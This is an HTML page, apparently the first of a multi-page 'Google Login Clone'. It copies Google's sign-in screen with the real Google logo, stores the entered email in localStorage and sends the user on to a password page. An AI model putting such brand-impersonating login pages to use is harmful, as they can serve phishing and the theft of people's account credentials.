<!DOCTYPE html>
<html lang="en" class="h-full bg-gray-100">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login Clone - Email</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="h-full flex items-center justify-center">
    <div class="w-full max-w-md p-8 bg-white rounded-2xl shadow-2xl">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo">
        </div>
        <h2 class="text-2xl font-semibold text-gray-800 mb-2">Sign in</h2>
        <p class="text-sm text-gray-600 mb-6">Use your Google Account</p>

        <div class="space-y-5">
            <div>
                <label class="block text-sm font-medium text-gray-700">Email or phone</label>
                <input id="google-email" type="email" placeholder="example@gmail.com"
                    class="w-full mt-1 p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required>
            </div>
            <div>
                <a href="#" class="text-sm text-blue-600 hover:underline">Forgot email?</a>
            </div>

            <div class="flex justify-between items-center mt-6">
                <button type="button" class="text-sm text-blue-600 hover:underline">Create account</button>
                <button onclick="nextPage()" class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition">Next</button>
            </div>
        </div>
    </div>

    <script>
        function nextPage() {
            const email = document.getElementById("google-email").value;
            if (!email) {
                alert("Please enter your email.");
                return;
            }
            localStorage.setItem('google-email', email);
            window.location.href = 'password.html';
        }
    </script>
</body>
</html>
